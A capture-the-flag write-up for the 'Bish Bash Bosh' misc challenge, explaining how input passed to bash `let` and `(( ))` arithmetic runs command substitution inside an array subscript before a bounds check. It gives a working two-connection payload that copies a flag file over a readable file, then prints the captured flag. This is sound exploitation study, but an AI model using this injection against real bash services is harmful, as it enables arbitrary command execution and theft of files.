# Bish Bash Bosh — platypwnies 2026 (misc)

Target: 10.83.2.242:9000

## Source

server.sh:
```bash
#!/usr/bin/env bash
files=(
 "/flag/flag.txt"
 "msg1"
 "msg2"
 "msg3"
)
echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1
if (( i < 1 || i > 3 )); then
 echo "Nuh uh"
 exit 1
fi
file="${files[i]}"
cat -- "$file"
```

The flag is `files[0]`, but the guard only lets `i` be 1..3 after the `let`.
Naive index 1 -> "Nuh uh" (0 < 1).

## Bug: command substitution in an array subscript inside arithmetic

`let i=$i-1` and `(( ... ))` evaluate the *value* of `i` as an arithmetic
expression. An array subscript written in that value is expanded as a shell
expansion, so `$` inside it runs — before the guard can reject the input.
The subscript then errors ("bad array subscript"), the guard prints "Nuh uh"
and exits, but the side effect has already happened.

## Exploit

Connection 1 — make the command substitution copy the flag over a readable
message file (the container runs as root and its fs is writable):

```
a[$(cat /flag/flag.txt >/msg1)]
```

`let i=$i-1` evaluates `i=a[$(cat /flag/flag.txt >/msg1)]-1`; the substitution
runs and copies the flag to `/msg1`. The arithmetic then errors, guard fires,
connection closes.

Connection 2 — read the now-poisoned message:

```
2
```

`let i=2-1` -> i=1, guard passes (1..3), `files[1]` is `msg1`, `cat` prints it.

## Flag

```
PP{l3t_t00k_my_fl4g!!!::8qfmmzoEVkn0}
```

## Notes

- stderr goes to the container log, not the socket, so `>&2` leaks nothing;
 the copy-then-read two-connection chain is what works.
- Any writable file reachable by `files[1..3]` works; `/msg1` is convenient.
